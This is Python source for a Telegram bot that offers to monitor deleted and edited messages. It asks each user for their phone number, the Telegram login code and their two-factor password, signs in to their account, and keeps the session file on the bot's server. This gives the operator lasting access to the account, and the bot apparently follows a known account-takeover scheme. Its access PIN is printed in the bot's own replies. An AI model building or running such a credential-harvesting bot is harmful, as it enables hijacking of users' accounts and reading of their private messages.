import os
import asyncio
import logging
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneCodeExpiredError,
    FloodWaitError
)
from telethon.tl.custom import Button
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

bot = TelegramClient('bot', API_ID, API_HASH)

# ========== ХРАНИЛИЩЕ ==========
user_sessions = {}  # {user_id: {'phone': '...', 'client': ..., 'step': '...', 'code_hash': '...'}}
authorized_users = set()
ACCESS_PIN = "5482"
message_cache = {}

@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.text.strip()

    # === ПИН-КОД ===
    if user_id not in authorized_users:
        if text == ACCESS_PIN:
            authorized_users.add(user_id)
            await event.reply("✅ **Пин-код верный!**\n\nИспользуй /start")
        else:
            await event.reply("🔐 **Введите пин-код:**\n`5482`")
        return

    # === МЕНЮ ===
    if text == "/start":
        await event.reply(
            "👋 **Добро пожаловать!**\n\n"
            "Выбери способ входа:",
            buttons=[
                [Button.text("📞 Ввести номер вручную", resize=True)],
                [Button.text("❓ Помощь")]
            ]
        )
        return

    # === ПОМОЩЬ ===
    if text == "❓ Помощь":
        await event.reply(
            "📚 **Помощь**\n\n"
            "1️⃣ **Пин-код:** 5482\n"
            "2️⃣ **Введи номер** в формате +79001234567\n"
            "3️⃣ **Код** придёт в Telegram\n"
            "4️⃣ **Введи код** сюда\n"
            "5️⃣ Если есть 2FA — введи пароль"
        )
        return

    # === ВВОД НОМЕРА ===
    if text == "📞 Ввести номер вручную":
        user_sessions[user_id] = {'step': 'waiting_phone'}
        await event.reply("📞 **Введи номер в формате:**\n`+79001234567`")
        return

    # === ПОЛУЧЕНИЕ НОМЕРА И ОТПРАВКА КОДА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_phone':
        phone = text
        user_sessions[user_id]['phone'] = phone
        user_sessions[user_id]['step'] = 'waiting_code'
        
        msg = await event.reply("🔄 **Отправляю код...**")
        
        try:
            client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
            await client.connect()
            
            sent_code = await client.send_code_request(phone)
            
            user_sessions[user_id]['client'] = client
            user_sessions[user_id]['code_hash'] = sent_code.phone_code_hash
            
            await msg.edit(
                "✅ **Код отправлен!**\n\n"
                "📨 Проверь Telegram — там должен быть 5-значный код\n"
                "⏳ Код действителен 2 минуты\n"
                "👇 **Введи код сюда:**"
            )
            
        except FloodWaitError as e:
            wait = e.seconds
            hours = wait // 3600
            minutes = (wait % 3600) // 60
            await msg.edit(
                f"⏳ **Слишком много попыток!**\n\n"
                f"Подожди {hours} ч {minutes} мин"
            )
            if user_id in user_sessions:
                del user_sessions[user_id]
            
        except Exception as e:
            await msg.edit(f"❌ **Ошибка:** {e}")
            if user_id in user_sessions:
                del user_sessions[user_id]
        return

    # === ПОЛУЧЕНИЕ КОДА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_code':
        code = text.strip()
        session = user_sessions[user_id]
        client = session['client']
        
        msg = await event.reply("🔑 **Проверяю код...**")
        
        try:
            await client.sign_in(session['phone'], code, phone_code_hash=session['code_hash'])
            
            me = await client.get_me()
            await msg.edit(
                f"✅ **Успешный вход!**\n\n"
                f"👤 Аккаунт: @{me.username}\n"
                f"🆔 ID: {me.id}\n\n"
                f"🔍 **Мониторинг запущен!**"
            )
            
            if user_id in user_sessions:
                del user_sessions[user_id]
            
            asyncio.create_task(monitor_user_chats(user_id, client))
            
        except SessionPasswordNeededError:
            user_sessions[user_id]['step'] = 'waiting_2fa'
            await msg.edit(
                "🔐 **Требуется двухфакторный пароль.**\n\n"
                "Введи свой пароль:"
            )
            
        except PhoneCodeInvalidError:
            await msg.edit(
                "❌ **Неверный код!**\n\n"
                "Попробуй ещё раз:"
            )
            
        except PhoneCodeExpiredError:
            await msg.edit(
                "⌛ **Код истёк.**\n\n"
                "Начни заново — /start"
            )
            if user_id in user_sessions:
                del user_sessions[user_id]
            
        except Exception as e:
            await msg.edit(f"❌ **Ошибка:** {e}")
            if user_id in user_sessions:
                del user_sessions[user_id]
        return

    # === 2FA ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_2fa':
        password = text
        session = user_sessions[user_id]
        client = session['client']
        
        msg = await event.reply("🔐 **Проверяю пароль...**")
        
        try:
            await client.sign_in(password=password)
            
            me = await client.get_me()
            await msg.edit(
                f"✅ **Вход с 2FA выполнен!**\n\n"
                f"👤 Аккаунт: @{me.username}\n"
                f"🆔 ID: {me.id}\n\n"
                f"🔍 **Мониторинг запущен!**"
            )
            
            if user_id in user_sessions:
                del user_sessions[user_id]
            
            asyncio.create_task(monitor_user_chats(user_id, client))
            
        except Exception as e:
            await msg.edit(f"❌ **Ошибка:** {e}")
        return

# === МОНИТОРИНГ ===
async def monitor_user_chats(user_id, client):
    await bot.send_message(user_id, "🔍 **Мониторинг запущен!**")
    
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        await bot.send_message(user_id, f"🗑 **Удалено** {len(event.deleted_ids)} сообщений")
    
    @client.on(events.MessageEdited)
    async def on_edit(event):
        await bot.send_message(user_id, f"✏️ **Изменено** сообщение")
    
    await client.run_until_disconnected()

# === ЗАПУСК ===
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен! Пин-код: 5482")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())